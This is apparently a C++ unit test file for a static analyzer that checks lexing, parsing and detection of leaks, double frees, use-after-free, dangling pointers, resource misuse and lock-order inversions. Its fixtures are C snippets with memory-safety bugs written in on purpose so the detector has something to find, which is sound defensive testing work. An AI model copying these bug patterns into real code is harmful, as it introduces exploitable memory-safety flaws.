// Unit tests for the static engine: lexer, parser and analyzer.
#include "check.h"

#include "analyzer.h"
#include "lexer.h"
#include "parser.h"

#include <algorithm>
#include <string>
#include <vector>

using namespace lcstatic;

namespace {

// Source text whose line 1 is the line after the opening R"( .
std::string code(const char *s) {
    std::string out = s;
    if (!out.empty() && out[0] == '\n')
        out.erase(0, 1);
    return out;
}

std::string toks(const std::string &src) {
    std::string out;
    for (const Token &t : lex(src))
        out += (out.empty() ? "" : " ") + t.text;
    return out;
}

std::string fn_names(const std::string &src) {
    std::string out;
    for (const Function &f : parse_functions(lex(src)))
        out += (out.empty() ? "" : " ") + f.name;
    return out;
}

// "rule@line" for every finding, sorted by line then rule.
std::string found(const std::string &src) {
    std::vector<Issue> all;
    for (const Function &f : parse_functions(lex(src)))
        for (Issue &i : analyze_function(f))
            all.push_back(std::move(i));
    std::sort(all.begin(), all.end(), [](const Issue &a, const Issue &b) {
        return a.line != b.line ? a.line < b.line : a.rule < b.rule;
    });
    std::string out;
    for (const Issue &i : all)
        out += (out.empty() ? "" : " ") + i.rule + "@" + std::to_string(i.line);
    return out;
}

std::vector<Issue> issues(const std::string &src) {
    std::vector<Issue> all;
    for (const Function &f : parse_functions(lex(src)))
        for (Issue &i : analyze_function(f))
            all.push_back(std::move(i));
    return all;
}

// "held>taken@line (first@line)" for each pair of file-scope mutexes locked
// in both orders, as static_engine.cpp reports them.
std::string inversions(const std::string &src) {
    const auto tokens = lex(src);
    std::vector<LockOrder> orders;
    for (const Function &f : parse_functions(tokens))
        analyze_function(f, &orders);
    std::string out;
    for (const auto &[first, second] :
         lock_inversions(with_calls(orders), file_scope_names(tokens)))
        out += (out.empty() ? "" : " ") + second.held + ">" + second.taken +
               "@" + std::to_string(second.line) + " (" + first.function + "@" +
               std::to_string(first.line) + ")";
    return out;
}

// found(), with the file's allocator summaries passed from function to
// function as static_engine.cpp does.
std::string found_in_file(const std::string &src) {
    Allocators allocators;
    Releasers releasers;
    std::vector<Issue> all;
    for (const Function &f : parse_functions(lex(src)))
        for (Issue &i : analyze_function(f, nullptr, &allocators, &releasers))
            all.push_back(std::move(i));
    std::sort(all.begin(), all.end(), [](const Issue &a, const Issue &b) {
        return a.line != b.line ? a.line < b.line : a.rule < b.rule;
    });
    std::string out;
    for (const Issue &i : all)
        out += (out.empty() ? "" : " ") + i.rule + "@" + std::to_string(i.line);
    return out;
}

bool has_message(const std::string &src, const std::string &needle) {
    for (const Issue &i : issues(src))
        if (i.message.find(needle) != std::string::npos)
            return true;
    return false;
}

void count_kinds(const Stmt &s, std::vector<int> &n) {
    ++n[s.kind];
    for (const auto &k : s.kids)
        count_kinds(*k, n);
    if (s.s1)
        count_kinds(*s.s1, n);
    if (s.s2)
        count_kinds(*s.s2, n);
}

} // namespace

// ---------------------------------------------------------------- lexer

TEST(lexer_basic_tokens_comments_strings) {
    CHECK_EQ(toks("int x = 1; // c\n/* b */ char *s = \"a\\\"b\";"),
             std::string("int x = 1 ; char * s = \"a\\\"b\" ;"));
    CHECK_EQ(toks("// don't\nint y;"), std::string("int y ;"));
    CHECK_EQ(toks("char c = '\\'';"), std::string("char c = '\\'' ;"));
}

TEST(lexer_raw_strings_and_prefixes) {
    // Prefixes are dropped; a raw string runs to its own delimiter.
    CHECK_EQ(toks("auto r = R\"x(a)\"b)x\";"),
             std::string("auto r = \"x(a)\"b)x\" ;"));
    CHECK_EQ(toks("auto w = L\"wide\"; auto u = u8\"utf\";"),
             std::string("auto w = \"wide\" ; auto u = \"utf\" ;"));
}

TEST(lexer_numbers_and_operators) {
    CHECK_EQ(toks("1'000 0x1fULL 1e-5 .5 3.f"),
             std::string("1'000 0x1fULL 1e-5 .5 3.f"));
    CHECK_EQ(toks("a->*b <=> c :: d ... e >>= f"),
             std::string("a ->* b <=> c :: d ... e >>= f"));
    CHECK_EQ(toks("x->y++ --z"), std::string("x -> y ++ -- z"));
}

TEST(lexer_line_and_column) {
    auto t = lex("int a;\n  char *p;");
    CHECK_EQ(t.size(), size_t(7));
    if (t.size() < 5)
        return;
    CHECK_EQ(t[4].text, std::string("*"));
    CHECK_EQ(t[4].line, 2);
    CHECK_EQ(t[4].col, 8);
}

TEST(lexer_takes_first_preprocessor_branch) {
    CHECK_EQ(toks("#if 0\nint bad;\n#else\nint good;\n#endif\n"),
             std::string("int good ;"));
    CHECK_EQ(toks("#ifdef A\nint a;\n#else\nint b;\n#endif\n"),
             std::string("int a ;"));
    CHECK_EQ(toks("#if X\nint a;\n#elif Y\nint b;\n#else\nint c;\n#endif"),
             std::string("int a ;"));
    CHECK_EQ(toks("#if 0\nint a;\n#elif 1\nint b;\n#else\nint c;\n#endif"),
             std::string("int b ;"));
    CHECK_EQ(
        toks("#ifdef A\n#if 0\nint x;\n#endif\nint y;\n#else\nint z;\n#endif"),
        std::string("int y ;"));
    CHECK_EQ(
        toks("#if 0\n#if 1\nint inner;\n#endif\nint dead;\n#endif\nint live;"),
        std::string("int live ;"));
}

TEST(lexer_skips_directives_with_continuations) {
    CHECK_EQ(toks("#define X \\\n  hidden tokens\nint z;"),
             std::string("int z ;"));
    CHECK_EQ(toks("const char *s = \"#if 0\";\nint k;"),
             std::string("const char * s = \"#if 0\" ; int k ;"));
}

// A file saved with Windows line ends: "#endif\r" is still "#endif".
TEST(lexer_crlf_files) {
    CHECK_EQ(toks("#ifdef A\r\nint a;\r\n#else /* x */\r\nint b;\r\n#endif\r\nint c;\r\n"),
             std::string("int a ; int c ;"));
    CHECK_EQ(toks("#define X \\\r\n  hidden tokens\r\nint z;\r\n"),
             std::string("int z ;"));
    CHECK_EQ(toks("#if 0\r\nint dead;\r\n#else\r\nint live;\r\n#endif\r\n"),
             std::string("int live ;"));
}

// --------------------------------------------------------------- parser

TEST(parser_finds_function_definitions) {
    const std::string src = code(R"(
namespace a { namespace b { int free_fn(int x) { return x; } } }
extern "C" { void c_fn(void) {} }
class K {
  public:
    K(int v) : v_(v), w_{v} {}
    ~K() {}
    int get() const { return v_; }
    bool operator==(const K &o) const { return v_ == o.v_; }
    int v_, w_;
};
K::K() {}
int K::outside(int) noexcept { return 0; }
template <class T> T twice(T v) { return v + v; }
auto trailing() -> int { return 1; }
auto lambda = [](int x) { return x; };
int prototype(int);
struct S *make_s(void) { return 0; }
)");
    CHECK_EQ(fn_names(src),
             std::string("free_fn c_fn K ~K get operator== K::K K::outside "
                         "twice trailing make_s"));
}

TEST(parser_detects_pointer_return_types) {
    auto fns = parse_functions(
        lex("char *mk(void) { return 0; } int n(void) { return 0; }"));
    CHECK_EQ(fns.size(), size_t(2));
    CHECK(fns[0].returns_pointer);
    CHECK(!fns[1].returns_pointer);
}

TEST(parser_builds_statement_tree) {
    const std::string src = code(R"(
void f(int n) {
    if (n) { n++; } else if (n > 2) n--; else { }
    while (n) n--;
    do { n++; } while (n < 3);
    for (int i = 0; i < n; i++) {}
    for (auto x : v) {}
    switch (n) { case 1: break; default: break; }
    goto end;
end:
    try { n = 1; } catch (...) { n = 2; }
    return;
}
)");
    auto fns = parse_functions(lex(src));
    CHECK_EQ(fns.size(), size_t(1));
    std::vector<int> n(Stmt::Empty + 1, 0);
    count_kinds(*fns[0].body, n);
    CHECK_EQ(n[Stmt::If], 2);
    CHECK_EQ(n[Stmt::While], 1);
    CHECK_EQ(n[Stmt::DoWhile], 1);
    CHECK_EQ(n[Stmt::For], 2);
    CHECK_EQ(n[Stmt::Switch], 1);
    CHECK_EQ(n[Stmt::Case], 2);
    CHECK_EQ(n[Stmt::Break], 2);
    CHECK_EQ(n[Stmt::Goto], 1);
    CHECK_EQ(n[Stmt::Label], 1);
    CHECK_EQ(n[Stmt::Try], 1);
    CHECK_EQ(n[Stmt::Return], 1);
}

TEST(parser_keeps_functions_apart_across_preprocessor_branches) {
    const std::string src = code(R"(
void a(void) {
#if defined(X)
    if (1) {
#else
    if (0) {
#endif
        n = 1;
    }
}
void b(void) {}
)");
    CHECK_EQ(fn_names(src), std::string("a b"));
}

// ------------------------------------------------------------- analyzer

TEST(leak_on_early_return) {
    CHECK_EQ(found(code(R"(
int f(int n) {
    char *b = malloc(n);
    if (!b)
        return -1;
    if (n > 10)
        return 1;
    free(b);
    return 0;
}
)")),
             std::string("memory-leak@6"));
}

TEST(ownership_handed_off_is_not_a_leak) {
    CHECK_EQ(found(code(R"(
char *g;
char *a(void) { char *p = malloc(1); return p; }
void b(void) { g = malloc(1); }
void c(void (*sink)(void *)) { void *p = malloc(1); sink(p); }
void d(char **out) { *out = malloc(1); }
void e(struct list *l) { char *p = malloc(1); l->head = p; }
)")),
             std::string(""));
}

TEST(leak_freed_on_some_paths_only) {
    const std::string src =
        "void f(int c) { char *p = malloc(1); if (c) free(p); }";
    CHECK_EQ(found(src), std::string("memory-leak@1"));
    CHECK(has_message(src, "not released on every path"));
}

TEST(leak_when_overwritten_and_in_loops) {
    CHECK_EQ(found(code(R"(
void f(void) {
    char *p = malloc(1);
    p = malloc(2);
    free(p);
}
void g(int n) {
    for (int i = 0; i < n; i++) {
        char *t = malloc(4);
        t[0] = 0;
    }
}
void h(char *s) {
    char *c = strdup(s);
    char *start = c;
    while (*c) c++;
    free(start);
}
)")),
             // g: reported where t goes out of scope, each iteration
             std::string("memory-leak@3 memory-leak@10"));
}

TEST(double_free_definite_and_possible) {
    const std::string src = code(R"(
void f(int c) {
    char *p = malloc(1);
    if (c)
        free(p);
    free(p);
}
void g(void) {
    char *p = malloc(1);
    free(p);
    free(p);
}
)");
    CHECK_EQ(found(src), std::string("double-free@5 double-free@10"));
    CHECK(has_message(src, "may be released twice"));
    CHECK(
        has_message(src, "released again; it was already released at line 9"));
}

TEST(use_after_free_through_deref_call_and_index) {
    CHECK_EQ(found(code(R"(
struct S { int x; };
void f(void) {
    struct S *s = malloc(sizeof *s);
    free(s);
    s->x = 1;
}
void g(void) {
    char *p = malloc(4);
    free(p);
    puts(p);
}
void h(void) {
    int *a = malloc(8);
    free(a);
    a[1] = 2;
}
void list(struct node *head) {
    for (struct node *n = head; n; n = n->next)
        free(n);
}
)")),
             std::string("heap-use-after-free@5 heap-use-after-free@10 "
                         "heap-use-after-free@15 heap-use-after-free@18"));
}

TEST(no_use_after_free_after_reassign_sizeof_or_compare) {
    CHECK_EQ(found(code(R"(
void f(void) {
    char *p = malloc(4);
    free(p);
    p = malloc(8);
    p[0] = 1;
    free(p);
}
void g(void) {
    char *p = malloc(4);
    free(p);
    size_t n = sizeof(*p);
    if (p == NULL) return;
}
void walk(struct node *n) {
    while (n) { struct node *next = n->next; free(n); n = next; }
}
)")),
             std::string(""));
}

TEST(realloc_patterns) {
    CHECK_EQ(found(code(R"(
void f(size_t n) {
    char *p = malloc(4);
    p = realloc(p, n);
    free(p);
}
void g(size_t n) {
    char *p = malloc(4);
    char *q = realloc(p, n);
    if (!q) { free(p); return; }
    free(q);
}
void h(size_t n) {
    char *p = malloc(4);
    free(p);
    char *q = realloc(p, n);
    free(q);
}
)")),
             std::string("memory-leak@3 heap-use-after-free@15"));
}

TEST(alloc_dealloc_mismatches) {
    CHECK_EQ(found(code(R"(
void f(void) {
    int *a = new int[4];
    delete a;
    int *b = new int;
    free(b);
    char *c = (char *)malloc(3);
    delete[] c;
    int *d = new int[2];
    delete[] d;
}
)")),
             std::string("alloc-dealloc-mismatch@3 alloc-dealloc-mismatch@5 "
                         "alloc-dealloc-mismatch@7"));
}

TEST(invalid_frees) {
    CHECK_EQ(found(code(R"(
void f(void) {
    int x;
    char buf[8];
    free(&x);
    free(buf);
    free("lit");
    char *p = malloc(4);
    free(p + 1);
    free(p);
    int *q = &x;
    free(q);
}
)")),
             std::string(
                 "invalid-free@4 invalid-free@5 invalid-free@6 invalid-free@8 "
                 "invalid-free@11"));
}

TEST(dangling_pointers) {
    CHECK_EQ(
        found(code(R"(
int *a(void) { int x = 1; return &x; }
char *b(void) { char buf[4]; return buf; }
int *c(int *p) { int x; p = &x; return p; }
int *g_ptr;
void d(void) { int x; g_ptr = &x; }
void e(void) { int x; g_ptr = &x; g_ptr = 0; }
static int *f(void) { static int s; return &s; }
int &h(int &r) { return r; }
std::string str(void) { char buf[8] = "x"; return buf; }
int *param(int v) { return &v; }
)")),
        std::string("dangling-pointer@1 dangling-pointer@2 dangling-pointer@3 "
                    "dangling-pointer@5"));
}

TEST(goto_cleanup_idiom) {
    CHECK_EQ(found(code(R"(
int f(int n) {
    int rc = -1;
    char *a = malloc(n);
    if (!a) goto out;
    char *b = malloc(n);
    if (!b) goto free_a;
    rc = 0;
    free(b);
free_a:
    free(a);
out:
    return rc;
}
)")),
             std::string(""));
}

TEST(switch_continue_and_loops) {
    CHECK_EQ(found(code(R"(
void f(int k, int n) {
    for (int i = 0; i < n; i++) {
        char *p = malloc(4);
        switch (k) {
        case 0:
            free(p);
            continue;
        default:
            free(p);
            break;
        }
    }
}
void g(int k) {
    char *p = malloc(1);
    switch (k) {
    case 1:
        free(p);
        break;
    }
}
)")),
             std::string("memory-leak@21"));
}

TEST(null_checks_narrow_state) {
    CHECK_EQ(found(code(R"(
int f(size_t n) {
    char *p;
    if ((p = malloc(n)) == NULL)
        return -1;
    free(p);
    return 0;
}
void g(void) {
    char *p = NULL;
    if (p) free(p);
    p = malloc(1);
    if (p != NULL) free(p);
}
int h(void) {
    char *a = malloc(1), *b = malloc(1);
    if (!a || !b) { free(a); free(b); return -1; }
    free(a); free(b);
    return 0;
}
)")),
             std::string(""));
}

TEST(terminating_paths_are_not_leaks) {
    CHECK_EQ(found(code(R"(
void f(void) { char *p = malloc(1); if (!p) exit(1); exit(0); }
void g(void) { int *p = new int; if (bad()) throw 1; delete p; }
void h(void) { char *p = malloc(1); abort(); }
)")),
             std::string(""));
}

TEST(cxx_ownership_idioms) {
    CHECK_EQ(found(code(R"(
struct W { int v; };
std::unique_ptr<W> a() { std::unique_ptr<W> p(new W); return p; }
void b(std::vector<W *> &v) { W *w = new W; v.push_back(w); }
W *c() { return new W; }
void d() { int *p = new int(1); auto f = [p]() { delete p; }; f(); }
void e() { W *raw = new W; std::shared_ptr<W> s(raw); }
class H {
    int *d_;
  public:
    H() : d_(new int[3]) {}
    ~H() { delete[] d_; }
    void bad() { delete[] d_; d_[0] = 1; }
};
)")),
             std::string("heap-use-after-free@12"));
}

TEST(if_init_and_do_while) {
    CHECK_EQ(found(code(R"(
void f(void) {
    if (char *p = (char *)malloc(1); p != nullptr) free(p);
    char *q;
    do { q = (char *)malloc(1); } while (0);
    free(q);
}
void g(int n) {
    char *q;
    do { q = (char *)malloc(1); } while (--n);
    free(q);
}
void h(void) {
    char *r;
    do { r = (char *)malloc(1); if (r) break; } while (1);
    free(r);
}
void k(char *s) {
    if (0) free(s);
    char *t = (char *)malloc(1);
    while (1) { free(t); return; }
}
void m(void) {
    char *u = (char *)malloc(1);
    if (false) free(u);
}
)")),
             // g's second iteration overwrites the first block on line 9.
             std::string("memory-leak@9 memory-leak@25"));
    // The body always ran, so q certainly holds the block: a definite
    // double free, not a "maybe" lost among unknown values.
    CHECK_EQ(found(code(R"(
void f(void) {
    char *q;
    do { q = (char *)malloc(1); } while (0);
    free(q);
    free(q);
}
)")),
             std::string("double-free@5"));
}

TEST(posix_memalign_and_auto) {
    CHECK_EQ(found(code(R"(
void f(void) {
    void *p;
    if (posix_memalign(&p, 64, 128)) return;
    free(p);
}
void g(void) { auto q = static_cast<int *>(malloc(4)); }
)")),
             std::string("memory-leak@6"));
}

// Patterns found in real code (llama.cpp/ggml) that once caused false reports.
TEST(regressions_from_real_code) {
    CHECK_EQ(found(code(R"(
struct E;
void loops(std::vector<E *> &v1, std::vector<E *> &v2) {
    for (E *e : v1) delete e;
    for (E *e : v2) delete e;
}
void decl_in_loop(int n, void **ctx) {
    for (int i = 0; i < n; i++) {
        auto c = static_cast<E *>(ctx[i]);
        delete c;
    }
}
struct T { void *src[2]; };
void local_struct(void) { struct T dst; int a; dst.src[0] = &a; use(&dst); }
struct C { int *pool; void alloc(int &p) { this->pool = &p; } };
struct V { std::string vendor; void fill(void) { char vendor[8] = {}; this->vendor = vendor; } };
void *tls(void) { thread_local char buf[8]; thread_local int e; return &e; }
void metal(void) { int x; thread const unsigned char *q8 = (thread const unsigned char *)&x; }
void swap_back(struct Ctx *o) { int tmp; int *saved = o->p; o->p = &tmp; run(o); o->p = saved; }
void catch_delete(void) {
    int *p = nullptr;
    try { p = new int(1); work(); } catch (...) { delete p; return; }
    delete p;
}
)")),
             std::string(""));
}

TEST(messages_name_variables_and_lines) {
    const std::string src = code(R"(
void f(void) {
    char *buf = malloc(10);
    free(buf);
    free(buf);
}
)");
    auto all = issues(src);
    CHECK_EQ(all.size(), size_t(1));
    if (!all.empty()) {
        CHECK_EQ(all[0].function, std::string("f"));
        CHECK_EQ(all[0].alloc_line, 2);
        CHECK_EQ(all[0].free_line, 3);
        CHECK(all[0].message.find("'buf'") != std::string::npos);
    }
}

// ---------------------------------------------------------- resources

TEST(resource_leak_double_close_and_use_after_close) {
    CHECK_EQ(found(code(R"(
void a(const char *p, char *b) {
    int fd = open(p, O_RDONLY);
    if (fd < 0)
        return;
    if (read(fd, b, 1) != 1)
        return;
    close(fd);
}
void c(const char *p) {
    FILE *f = fopen(p, "r");
    if (!f) return;
    fclose(f);
    fclose(f);
}
void d(void) {
    FILE *s = popen("ls", "r");
    if (s) pclose(s);
    DIR *dir = opendir(".");
    if (dir == NULL) return;
    closedir(dir);
    readdir(dir);
}
)")),
             std::string("resource-leak@6 double-close@13 use-after-close@21"));
}

TEST(resource_mismatches) {
    CHECK_EQ(found(code(R"(
void m(void) {
    FILE *p = popen("ls", "r");
    if (!p) return;
    fclose(p);
    FILE *f = fopen("x", "r");
    if (f) free(f);
    char *q = malloc(4);
    fclose(q);
}
)")),
             std::string("alloc-dealloc-mismatch@4 alloc-dealloc-mismatch@6 "
                         "alloc-dealloc-mismatch@8"));
    CHECK(has_message(code(R"(
void m(void) { FILE *p = popen("ls", "r"); if (p) fclose(p); }
)"),
                      "the FILE stream from popen() (line 1) is released with "
                      "fclose()"));
}

TEST(descriptors_are_tested_by_sign) {
    CHECK_EQ(found(code(R"(
int a(const char *x, const char *y) {
    int in = -1, out = -1, rc = -1;
    if (!x) goto done;
    in = open(x, O_RDONLY);
    if (in == -1) goto done;
    out = open(y, O_WRONLY | O_CREAT, 0600);
    if (out < 0) goto done;
    rc = 0;
done:
    if (in != -1) close(in);
    if (out >= 0) close(out);
    return rc;
}
void b(char *buf) {
    int fd = dup(0);
    if (fd >= 0) {
        close(fd);
        printf("%d\n", fd);
        write(fd, buf, 1);
    }
}
int c(const char *p) {
    int fd = open(p, O_RDONLY);
    if (fd < 0) return -1;
    return fd;
}
void e(struct conn *k, const char *p) {
    k->fd = open(p, O_RDONLY);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    s = -1;
}
)")),
             // printing a closed descriptor's number is not a use; writing
             // to it is
             std::string("use-after-close@19 resource-leak@30"));
}

// Shapes from llama.cpp that were false positives.
TEST(resource_regressions_from_real_code) {
    CHECK_EQ(found(code(R"(
int serve(void) {
    native_socket_t sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET_VAL)
        return -1;
    close(sock);
    return 0;
}
int pick(const char **names, const char *id, int n) {
    int fd;
    if (id == NULL) {
        for (int i = 0; i < n; ++i) {
            fd = open(names[i], O_RDONLY, 0);
            if (fd != -1)
                break;
        }
    } else {
        fd = open(id, O_RDONLY, 0);
    }
    if (fd == -1)
        return -1;
    close(fd);
    return 0;
}
void cloexec(int *fds) {
    int moved;
    for (int i = 0; i < 2; i++) {
        moved = fcntl(fds[i], F_DUPFD, 3);
        if (moved != -1) {
            close(moved);
            moved = -1;
        }
    }
}
void drain(int n) {
    char *p;
    for (int i = 0; i < n; i++) {
        p = get();
        free(p);
    }
}
void drain_out(int n) {
    char *p;
    for (int i = 0; i < n; i++) {
        pop(&p);
        free(p);
    }
}
void either(int x) {
    char *p;
    if (x)
        p = malloc(1);
    else
        p = malloc(2);
    free(p);
}
)")),
             std::string(""));
    // Still a leak when the other candidate is held elsewhere and not freed.
    CHECK_EQ(found(code(R"(
void both(int c) {
    char *p = malloc(1);
    char *q = malloc(2);
    if (c)
        p = q;
    free(p);
}
)")),
             std::string("memory-leak@5 memory-leak@7"));
}

TEST(temp_files_and_fcntl_dups) {
    CHECK_EQ(found(code(R"(
void a(char *tmpl) {
    int fd = mkstemp(tmpl);
    if (fd < 0) return;
    unlink(tmpl);
}
int b(int fd) {
    int copy = fcntl(fd, F_DUPFD_CLOEXEC, 3);
    if (copy == -1) return -1;
    int flags = fcntl(copy, F_GETFL);
    return flags;
}
void c(int fd) {
    int x = fcntl(fd, F_GETFD);
    int y = fcntl(fd, F_SETFD, x | FD_CLOEXEC);
}
)")),
             std::string("resource-leak@5 resource-leak@10"));
    // Constant first, as in llama.cpp's vendored subprocess.h.
    CHECK_EQ(found(code(R"(
int above_std(int *fds, int i) {
    int moved = fcntl(fds[i], F_DUPFD, 3);
    if (-1 != moved) {
        if (-1 == fcntl(moved, F_SETFD, 1)) {
            close(moved);
            moved = -1;
        }
    }
    if (-1 == moved)
        return -1;
    fds[i] = moved;
    return 0;
}
int in_loop(int *fds) {
    int moved;
    for (int i = 0; i < 2; i++) {
        moved = fcntl(fds[i], F_DUPFD, 3);
        if (-1 != moved && -1 == fcntl(moved, F_SETFD, 1)) {
            close(moved);
            moved = -1;
        }
        if (-1 == moved)
            return -1;
        close(moved);
    }
    return 0;
}
int yoda_sign(const char *p) {
    int fd = open(p, 0);
    if (0 > fd)
        return -1;
    close(fd);
    return 0;
}
int stored_in_loop(int *fds) {
    int moved;
    for (int i = 0; i < 2; i++) {
        moved = fcntl(fds[i], F_DUPFD, 3);
        if (-1 != moved && -1 == fcntl(moved, F_SETFD, 1)) {
            close(moved);
            moved = -1;
        }
        if (-1 == moved)
            return -1;
        fds[i] = moved;
    }
    return 0;
}
)")),
             std::string(""));
}

TEST(out_parameter_and_buffer_allocators) {
    CHECK_EQ(found(code(R"(
int pm(void) {
    void *p;
    posix_memalign(&p, 16, 64);
    return 0;
}
int as(int x) {
    char *s;
    if (asprintf(&s, "%d", x) == -1)
        return -1;
    puts(s);
    return 0;
}
void lines(FILE *f) {
    char *line = NULL;
    size_t n = 0;
    while (getline(&line, &n, f) != -1)
        puts(line);
}
int rp(const char *p) {
    char *r = realpath(p, NULL);
    if (!r)
        return -1;
    puts(r);
    return 0;
}
void twice(int x) {
    char *s;
    asprintf(&s, "%d", x);
    asprintf(&s, "%d", x + 1);
    free(s);
}
)")),
             std::string("memory-leak@4 memory-leak@11 memory-leak@18 "
                         "memory-leak@24 memory-leak@29"));
    // Released, or the call failed (tested directly or through a variable).
    CHECK_EQ(found(code(R"(
int pm(void) {
    void *p;
    if (posix_memalign(&p, 16, 64) != 0)
        return -1;
    free(p);
    void *q = NULL;
    const int rc = posix_memalign(&q, 16, 64);
    if (rc)
        return -1;
    free(q);
    return 0;
}
int as(int x) {
    char *s;
    int n = asprintf(&s, "%d", x);
    if (n < 0)
        return -1;
    free(s);
    return 0;
}
void lines(FILE *f) {
    char *line = NULL;
    size_t n = 0;
    while (getline(&line, &n, f) != -1)
        puts(line);
    free(line);
}
void grown(FILE *f) {
    size_t n = 128;
    char *line = malloc(n);
    while (getline(&line, &n, f) != -1)
        puts(line);
    free(line);
}
int cwd(void) {
    char *d = getcwd(NULL, 0);
    if (!d)
        return -1;
    char buf[64];
    char *e = getcwd(buf, sizeof buf);
    free(d);
    if (!e)
        return -1;
    puts(e);
    return 0;
}
)")),
             std::string(""));
}

TEST(helpers_that_return_fresh_memory) {
    // Callers of allocating helpers defined earlier in the file.
    CHECK_EQ(found_in_file(code(R"(
static char *make_label(int id) {
    char *s = malloc(32);
    if (s)
        snprintf(s, 32, "item-%d", id);
    return s;
}
void *xmalloc(size_t n) {
    void *p = malloc(n);
    if (!p)
        abort();
    return p;
}
char *xstrdup(const char *s) { return strcpy(xmalloc(strlen(s) + 1), s); }
char *dup_twice(const char *s) { return strdup(s); }
struct node *new_node(int v) {
    struct node *n = (struct node *)xmalloc(sizeof *n);
    n->v = v;
    return n;
}
Foo *make_foo() { return new Foo(1); }
int print_label(int id) {
    char *label = make_label(id);
    if (!label)
        return -1;
    puts(label);
    return 0;
}
void wrapped(void) {
    char *p = dup_twice("x");
    puts(p);
}
void chained(void) {
    struct node *n = new_node(3);
    free(n);
    struct node *m = new_node(4);
}
void cxx() {
    Foo *f = make_foo();
    free(f);
}
)")),
             std::string("memory-leak@26 memory-leak@31 memory-leak@36 "
                         "alloc-dealloc-mismatch@39"));
    // Not allocators: the result is also kept elsewhere, comes from the
    // caller, may be a global, or is released through a helper.
    CHECK_EQ(found_in_file(code(R"(
static char *g_last;
char *remember(const char *s) {
    char *c = strdup(s);
    g_last = c;
    return c;
}
char *trim(char *s) {
    while (*s == ' ')
        s++;
    return s;
}
char *cached(void) {
    static char *buf;
    if (!buf)
        buf = malloc(64);
    return buf;
}
struct node *push(struct node *head, int v) {
    struct node *n = malloc(sizeof *n);
    n->v = v;
    n->next = head;
    return n;
}
char *pick(int c) {
    if (!c)
        return lookup(c);
    return strdup("a");
}
void users(char *line) {
    char *a = remember("x");
    char *b = trim(line);
    char *c = cached();
    char *d = pick(1);
    struct node *list = NULL;
    for (int i = 0; i < 3; i++)
        list = push(list, i);
    destroy_list(list);
}
)")),
             std::string(""));
    // Without the summaries (one function at a time) nothing is known.
    CHECK_EQ(found(code(R"(
char *make(void) { return malloc(4); }
void use(void) { char *p = make(); }
)")),
             std::string(""));
}

TEST(helpers_that_release_their_argument) {
    CHECK_EQ(found_in_file(code(R"(
struct conn { int fd; char *host; };
static void conn_free(struct conn *c) {
    if (!c)
        return;
    free(c->host);
    free(c);
}
static void maybe_free(char *p, int really) {
    if (!really)
        return;
    free(p);
}
static void log_close(FILE *f) { fclose(f); }
static void drop(int unused, Foo *f) { delete f; }
void twice(struct conn *c) {
    conn_free(c);
    conn_free(c);
}
void after(void) {
    struct conn *c = malloc(sizeof *c);
    conn_free(c);
    c->fd = 3;
}
void ok(void) {
    struct conn *c = malloc(sizeof *c);
    conn_free(c);
    char *s = strdup("x");
    maybe_free(s, 1);
    maybe_free(s, 1);
    FILE *f = fopen("/tmp/x", "w");
    if (!f)
        return;
    log_close(f);
}
void close_twice(void) {
    FILE *f = fopen("/tmp/x", "w");
    if (!f)
        return;
    log_close(f);
    fclose(f);
}
void second_argument(void) {
    char *p = malloc(4);
    drop(0, (Foo *)p);
}
)")),
             // twice, use after, double close, and drop()'s delete of a
             // malloc'd block; maybe_free releases only sometimes
             std::string("double-free@17 heap-use-after-free@22 "
                         "double-close@40 alloc-dealloc-mismatch@44"));
}

TEST(lock_order_across_functions) {
    const std::string src = code(R"(
static pthread_mutex_t g_accounts = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t g_log = PTHREAD_MUTEX_INITIALIZER, g_stats;
std::mutex g_cache;
void transfer(int x) {
    pthread_mutex_lock(&g_accounts);
    pthread_mutex_lock(&g_log);
    pthread_mutex_unlock(&g_log);
    pthread_mutex_unlock(&g_accounts);
}
void audit(void) {
    pthread_mutex_lock(&g_log);
    pthread_mutex_lock(&g_accounts);
    pthread_mutex_unlock(&g_accounts);
    pthread_mutex_unlock(&g_log);
}
void report(void) {
    pthread_mutex_lock(&g_accounts);
    pthread_mutex_lock(&g_stats);
    pthread_mutex_unlock(&g_stats);
    pthread_mutex_unlock(&g_accounts);
}
void maybe(void) {
    pthread_mutex_lock(&g_stats);
    if (pthread_mutex_trylock(&g_accounts) == 0)
        pthread_mutex_unlock(&g_accounts);
    pthread_mutex_unlock(&g_stats);
}
void one(struct pair *p) {
    pthread_mutex_lock(&p->a);
    pthread_mutex_lock(&p->b);
    pthread_mutex_unlock(&p->b);
    pthread_mutex_unlock(&p->a);
}
void two(struct pair *p) {
    pthread_mutex_lock(&p->b);
    pthread_mutex_lock(&p->a);
    pthread_mutex_unlock(&p->a);
    pthread_mutex_unlock(&p->b);
}
void sometimes(int c) {
    if (c)
        pthread_mutex_lock(&g_stats);
    pthread_mutex_lock(&g_accounts);
    pthread_mutex_unlock(&g_accounts);
    if (c)
        pthread_mutex_unlock(&g_stats);
}
void cxx_one() {
    g_cache.lock();
    pthread_mutex_lock(&g_log);
    pthread_mutex_unlock(&g_log);
    g_cache.unlock();
}
void cxx_two() {
    std::lock_guard<std::mutex> hold(g_cache);
    pthread_mutex_lock(&g_log);
    pthread_mutex_unlock(&g_log);
    int local = 0;
}
)");
    // transfer/audit only: a try-lock never waits, p->a in one() and two()
    // may be two objects, sometimes() holds g_stats on some paths only, and
    // cxx_two's guard on g_cache gives g_cache>g_log, which nothing opposes
    CHECK_EQ(inversions(src), std::string("g_log>g_accounts@12 (transfer@6)"));
    CHECK(file_scope_names(lex(src)) ==
          (std::set<std::string>{"PTHREAD_MUTEX_INITIALIZER", "g_accounts",
                                 "g_cache", "g_log", "g_stats"}));
}

TEST(va_lists) {
    CHECK_EQ(found(code(R"(
int sum(int n, ...) {
    va_list ap;
    va_start(ap, n);
    if (n < 0)
        return -1;
    int s = 0;
    for (int i = 0; i < n; i++)
        s += va_arg(ap, int);
    va_end(ap);
    return s;
}
void log_twice(const char *fmt, ...) {
    va_list ap, copy;
    va_start(ap, fmt);
    va_copy(copy, ap);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
}
int restart(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
}
void again(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    va_end(ap);
    va_end(ap);
}
)")),
